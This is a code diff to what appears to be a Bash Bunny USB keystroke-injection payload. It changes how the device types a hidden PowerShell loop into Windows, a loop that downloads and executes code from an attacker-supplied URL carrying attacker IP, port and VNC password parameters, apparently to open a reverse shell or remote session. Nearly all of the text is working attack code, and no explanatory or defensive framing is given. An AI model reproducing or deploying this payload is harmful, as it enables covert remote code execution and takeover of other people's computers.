@@ -31,8 +31,10 @@ else
     URL="http://$HOST_IP/?attack_type=reverse&port=$PORT&attacker_ip=$ATTACKER_IP&password=$VNC_PASS"
 fi
 
-RUN WIN "powershell -WindowStyle hidden \"while (\$true) { try { IEX(New-Object Net.WebClient).DownloadString('$URL'); exit } catch { Start-sleep -s 1 } }\""
-QUACK DELAY 500
+RUN WIN "cmd.exe"
+QUACK DELAY 250
+QUACK STRING "powershell -WindowStyle hidden \"while (\$true) { try { IEX(New-Object Net.WebClient).DownloadString('$URL'); exit } catch { Start-sleep -s 1 } }\""
+QUACK DELAY 250
 QUACK ENTER
 
 LED SPECIAL4
@@ -41,5 +43,4 @@ ATTACKMODE RNDIS_ETHERNET
 
 LED ATTACK
 while [ ! -e  "/root/udisk/payloads/$SWITCH_POSITION/EOF" ]; do sleep 1; done;
-sleep 1
 LED FINISH
